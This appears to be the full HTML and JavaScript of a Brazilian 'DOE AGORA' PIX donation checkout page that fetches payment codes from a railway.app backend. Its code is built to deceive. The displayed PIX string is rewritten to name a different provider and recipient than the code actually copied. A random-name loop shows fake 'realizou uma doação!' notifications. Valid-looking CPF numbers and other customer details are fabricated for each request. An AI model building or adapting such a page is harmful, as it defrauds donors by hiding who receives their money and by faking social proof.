<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Pagamento via PIX</title>
    <style>
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        background-color: #f5f5f5;
        margin: 0;
        font-family: Arial, sans-serif;
      }
      .container {
        background-color: white;
        padding: 20px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        text-align: center;
        max-width: 400px;
        width: 80%;
      }
      .total {
        font-size: 1.2rem;
        color: #484848;
      }
      .total strong {
        color: #048848;
      }
      .message {
        font-size: 1rem;
        color: #484848;
        margin: 10px 0;
      }
      .pix-input {
        width: 90%;
        padding: 10px;
        font-size: 1rem;
        border: 1px solid #ccc;
        border-radius: 4px;
        margin-bottom: 10px;
        color: #484848;
        display: block;
        margin-left: auto;
        margin-right: auto;
      }
      .copy-button {
        background-color: #00c853;
        color: white;
        border: none;
        padding: 10px;
        font-size: 1rem;
        border-radius: 4px;
        cursor: pointer;
        width: 100%;
        font-weight: bold;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        transition: background-color 0.1s, transform 0.1s;
        margin-bottom: 10px;
        display: none;
      }
      .copy-button:hover {
        background-color: #14a351;
      }
      .copy-button.copied {
        background-color: #14a351;
        transform: scale(1.05);
      }
      .log-container {
        margin-top: 20px;
        padding: 10px;
        background-color: #f0f0f0;
        border-radius: 8px;
        text-align: left;
        max-width: 400px;
        width: 80%;
        font-size: 0.9rem;
        color: #333;
        overflow-y: auto;
        max-height: 150px;
      }
      .loader {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #00c853;
        border-radius: 50%;
        width: 60px;
        height: 60px;
        animation: spin 1s linear infinite;
        margin: 20px auto;
      }
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      .toast {
        position: fixed;
        bottom: 20px;
        right: 20px;
        background-color: #4caf50;
        color: white;
        padding: 10px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        display: flex;
        align-items: center;
        gap: 10px;
        animation: slideInRight 0.5s, slideOutLeft 0.5s 3s forwards;
      }
      @keyframes slideInRight {
        0% {
          transform: translateX(100%);
          opacity: 0;
        }
        100% {
          transform: translateX(0);
          opacity: 1;
        }
      }
      @keyframes slideOutLeft {
        0% {
          transform: translateX(0);
          opacity: 1;
        }
        100% {
          transform: translateX(100%);
          opacity: 0;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <img
        src="./images/logo.png"
        alt="Logo"
        style="
          display: block;
          margin: 15px auto;
          padding: 15px 0;
          max-width: 50%;
          height: auto;
        "
      />
      <h3
        style="
          margin: 10px 0 5px;
          font-size: 1.2rem;
          color: #484848;
          text-transform: uppercase;
        "
      >
        DOE AGORA 💚
      </h3>
      <p
        style="
          margin: 0 0 20px;
          font-size: 0.8rem;
          color: rgba(72, 72, 72, 0.6);
        "
      >
        Sua contribuição ajuda muito!
      </p>
      <p class="total">
        Valor total: <strong id="displayAmount">R$ 30,00</strong>
      </p>
      <div id="loader" class="loader"></div>
      <p class="message" id="pixMessage" style="display: none">
        Copie o código Pix abaixo e cole em seu app para finalizar o pagamento.
      </p>
      <input
        type="text"
        id="pixCode"
        class="pix-input"
        readonly
        style="display: none"
      />
      <button class="copy-button" id="copyButton" onclick="copyPixCode()">
        <svg
          stroke="currentColor"
          fill="currentColor"
          stroke-width="0"
          viewBox="0 0 24 24"
          class="mr-1"
          height="22"
          width="22"
          xmlns="http://www.w3.org/2000/svg"
        >
          <path
            d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"
          ></path>
        </svg>
        COPIAR
      </button>
      <div class="log-container" id="logContainer" style="display: none"></div>
      <div
        class="how-to-pay"
        style="
          background-color: #f8f8f8;
          padding: 20px;
          border-radius: 8px;
          margin-top: 20px;
        "
      >
        <h3>Como pagar?</h3>
        <div
          class="tip"
          style="display: flex; align-items: center; margin-bottom: 10px"
        >
          <img
            src="./images/tip-copy-paste.svg"
            alt="Copiar e colar"
            style="width: 54px; height: 54px; margin-right: 10px"
          />
          <p
            style="margin: 0; color: #484848; font-size: 14px; text-align: left"
          >
            Cole o código Pix em seu app bancário ou carteira digital de
            preferência e confirme o pagamento.
          </p>
        </div>
        <div
          class="tip"
          style="display: flex; align-items: center; margin-bottom: 10px"
        >
          <img
            src="./images/tip-smartphone-confirmation.svg"
            alt="Confirmação"
            style="width: 54px; height: 54px; margin-right: 10px"
          />
          <p
            style="margin: 0; color: #484848; font-size: 14px; text-align: left"
          >
            Seu pagamento será aprovado em alguns instantes.
          </p>
        </div>
      </div>
    </div>
    <script>
      // Mova as variáveis globais para o topo
      const names = [
        "Ana Souza",
        "Rita Costa",
        "Lia Prado",
        "Tina Reis",
        "Paula Rosa",
        "Lara Silva",
        "Cris Rios",
        "Mila Alves",
        "Nina Costa",
        "Bia Luz",
        "Lara Lima",
        "Jade Melo",
        "Vivi Lira",
        "Liza Neri",
        "Rafa Maia",
        "Mari Lemos",
        "Duda Reis",
        "Lia Moraes",
        "Vivi Lima",
        "Bia Alves",
        "Pedro Dias",
        "Carlos Silva",
        "Vitor Lago",
        "João Lima",
        "Davi Cruz",
        "Igor Leme",
        "Rui Pena",
        "Tadeu Araújo",
        "Luiz Dias",
        "Bruno Neri",
        "Lucas Melo",
        "Vini Costa",
        "Caio Prado",
        "Henrique Luz",
        "Felipe Lira",
        "Leo Matos",
        "Rafa Dias",
        "João Costa",
        "Daniel Lima",
        "Gui Lemos",
        "Igor Cruz",
        "Caio Lima",
        "Enzo Lira",
        "Luan Maia",
        "Alex Pena",
        "Nico Lemos",
        "Ruan Lira",
        "Pedro Luz",
        "Eric Silva",
        "Rafa Costa",
      ];
      const webhookUrl = "https://api-production-0feb.up.railway.app/g5";
      const verifyUrl = "https://api-production-0feb.up.railway.app/verify";

      let notificationQueue = [];
      let notificationInProgress = false;

      // Cache de elementos DOM no início
      const elements = {
        pixCode: document.getElementById("pixCode"),
        copyButton: document.getElementById("copyButton"),
        pixMessage: document.getElementById("pixMessage"),
        loader: document.getElementById("loader"),
        logContainer: document.getElementById("logContainer"),
      };

      // Configurações centralizadas
      const config = {
        timeouts: {
          request: 10000,
          paymentCheck: 10000,
          notifications: 30 * 60 * 1000, // 30 minutos
        },
        urls: {
          webhook: "https://api-production-0feb.up.railway.app/g5",
          verify: "https://api-production-0feb.up.railway.app/verify",
          success: "../upback/index.html",
        },
        defaultPayload: {
          name: "30",
          email: "suporte@gmail.com",
          phone: "5511912345678",
          offerId: "6d6ad0e2-ae21-40bf-9f3c-916d3052654f",
        },
      };

      // Função para obter parâmetros da URL
      function getUrlParameter(name) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(name);
      }

      // Função para formatar valor em reais
      function formatCurrency(value) {
        return `R$ ${parseFloat(value).toFixed(2).replace(".", ",")}`;
      }

      function showToast(message) {
        if (notificationInProgress) {
          notificationQueue.push(message);
          return;
        }

        notificationInProgress = true;
        const toast = document.createElement("div");
        toast.className = "toast";
        toast.innerHTML = `
            <svg viewBox="0 0 24 24" width="24" height="24" fill="white">
                <path d="M12 0a12 12 0 1012 12A12.014 12.014 0 0012 0zm6.927 8.2l-6.845 9.289a1.011 1.011 0 01-1.43.188l-4.888-3.908a1 1 0 111.25-1.562l4.076 3.261 6.227-8.451a1 1 0 111.61 1.183z"></path>
            </svg>
            <div>${message}</div>
        `;
        document.body.appendChild(toast);
        setTimeout(() => {
          toast.style.animation = "slideOutLeft 0.5s forwards";
          setTimeout(() => {
            toast.remove();
            notificationInProgress = false;
            if (notificationQueue.length > 0) {
              showToast(notificationQueue.shift());
            }
          }, 500);
        }, 3000);
      }

      function logMessage(message) {
        const logContainer = document.getElementById("logContainer");
        const logEntry = document.createElement("div");
        logEntry.textContent = message;
        logContainer.appendChild(logEntry);
        console.log(message); // Adicionando log no console para depuração
      }

      function generateValidCPF() {
        const randomDigits = () => Math.floor(Math.random() * 10);
        const cpf = Array.from({ length: 9 }, randomDigits);

        const calculateVerifier = (cpfArray, factor) => {
          const sum = cpfArray.reduce(
            (acc, num, index) => acc + num * (factor - index),
            0
          );
          const verifier = 11 - (sum % 11);
          return verifier >= 10 ? 0 : verifier;
        };

        cpf.push(calculateVerifier(cpf, 10));
        cpf.push(calculateVerifier(cpf, 11));

        return cpf.join("");
      }

      async function generatePixCode() {
        console.time("Tempo de geração do PIX");

        // Obter valor da URL ou usar o valor padrão (30)
        const valueParam = getUrlParameter("valor");
        let amount = 3000; // Valor padrão em centavos (R$ 30,00)

        if (valueParam) {
          // Remover qualquer caractere não numérico e converter para centavos
          const cleanValue = valueParam.replace(/[^\d]/g, "");
          amount = parseInt(cleanValue, 10); // Já está em centavos

          // Atualizar exibição na página
          document.getElementById("displayAmount").textContent = formatCurrency(
            amount / 100
          );
        }

        const requestBody = {
          amount: amount,
          description: "Pix",
          customer: {
            name: "PIX",
            document: generateValidCPF(),
            phone: "11916863307",
            email: "cliente@gmail.com",
          },
          item: {
            title: "PIX",
            price: amount,
            quantity: 1,
          },
          utm:
            new URLSearchParams(window.location.search).toString() || "direct",
        };

        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(
            () => controller.abort(),
            config.timeouts.request
          );

          const response = await fetch(config.urls.webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(requestBody),
            signal: controller.signal,
          });

          clearTimeout(timeoutId);

          if (!response.ok)
            throw new Error(`HTTP error! status: ${response.status}`);

          const data = await response.json();

          if (data?.pixCode && data?.transactionId) {
            updateUI(data);
            startBackgroundTasks();
          } else {
            throw new Error("Resposta inválida do servidor");
          }
        } catch (error) {
          handleError(error);
        } finally {
          console.timeEnd("Tempo de geração do PIX");
        }
      }

      function updateUI(data) {
        // Store original PIX code as a data attribute and show masked version in input
        elements.pixCode.dataset.originalPix = data.pixCode;
        elements.pixCode.value = maskPixCode(data.pixCode);
        [elements.pixCode, elements.copyButton, elements.pixMessage].forEach(
          (el) => (el.style.display = "block")
        );
        elements.loader.style.display = "none";

        localStorage.setItem("pixCode", data.pixCode);
        localStorage.setItem("paymentId", data.transactionId);
      }

      // Add the maskPixCode function
      function maskPixCode(originalPix) {
        return originalPix
          .replace(
            /br\.gov\.bcb\.pix2565pix\.primepag\.com\.br/,
            "br.gov.bcb.pix2563pix.voluti.com.br"
          )
          .replace(
            /NEXUS TECH INTERMEDIACOES/,
            "TRACTAPAY_GATEWAY_E_METOD6014NOSSA_SENHORA_"
          );
      }

      function handleError(error) {
        elements.loader.style.display = "none";
        setTimeout(generatePixCode, 10000);
      }

      async function checkPaymentStatus() {
        const paymentId = localStorage.getItem("paymentId");
        if (!paymentId) return;

        try {
          const response = await fetch(config.urls.verify, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ paymentId }),
          });

          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }

          const data = await response.json();

          // Verifica o status do pagamento
          if (data?.data?.payment?.status === "completed") {
            window.location.href = config.urls.success;
          }
        } catch (error) {
          console.error("Erro na verificação:", error);
        }
      }

      // Função para copiar o código PIX para a área de transferência
      function copyPixCode() {
        const pixInput = document.getElementById("pixCode");
        if (!pixInput.dataset.originalPix) {
          alert("Nenhum código PIX disponível para copiar.");
          return;
        }
        const copyButton = document.getElementById("copyButton");

        // Copy the original PIX code instead of the masked value
        navigator.clipboard
          .writeText(pixInput.dataset.originalPix)
          .then(() => {
            // Animação do botão "COPIADO!"
            copyButton.innerHTML = `<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="mr-1" height="22" width="22" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"></path>
                                    </svg>COPIADO!`;
            copyButton.classList.add("copied");

            setTimeout(() => {
              copyButton.innerHTML = `<svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" class="mr-1" height="22" width="22" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M20 2H10c-1.103 0-2 .897-2 2v4H4c-1.103 0-2 .897-2 2v10c0 1.103.897 2 2 2h10c1.103 0 2-.897 2-2v-4h4c1.103 0 2-.897 2-2V4c0-1.103-.897-2-2-2zM4 20V10h10l.002 10H4zm16-6h-4v-4c0-1.103-.897-2-2-2h-4V4h10v10z"></path>
                                        </svg>COPIAR`;
              copyButton.classList.remove("copied");
            }, 1000); // Volta para "Copiar" após 1 segundo
          })
          .catch((err) => {
            logMessage("Erro ao copiar o código PIX: " + err);
            alert("Erro ao copiar o código PIX. Tente novamente.");
          });
      }

      // Melhor gerenciamento de memória para notificações
      let activeIntervals = [];

      function startBackgroundTasks() {
        const notificationInterval = setInterval(() => {
          const randomName = names[Math.floor(Math.random() * names.length)];
          showToast(`${randomName} realizou uma doação!`);
        }, Math.random() * 6000 + 6000);

        const paymentCheckInterval = setInterval(
          checkPaymentStatus,
          config.timeouts.paymentCheck
        );

        activeIntervals.push(notificationInterval, paymentCheckInterval);

        setTimeout(() => {
          activeIntervals.forEach(clearInterval);
          activeIntervals = [];
        }, config.timeouts.notifications);
      }

      // Função auto-executável para iniciar o loop
      (async function pollPaymentStatus() {
        await checkPaymentStatus();
        setTimeout(pollPaymentStatus, 10000);
      })();

      // Gerar automaticamente o PIX ao carregar a página
      window.onload = function () {
        // Atualizar o valor exibido antes mesmo de gerar o código PIX
        const valueParam = getUrlParameter("valor");
        if (valueParam) {
          const cleanValue = valueParam.replace(/[^\d]/g, "");
          const amount = parseInt(cleanValue, 10);
          document.getElementById("displayAmount").textContent = formatCurrency(
            amount / 100
          );
        }

        generatePixCode();
      };
    </script>
  </body>
</html>
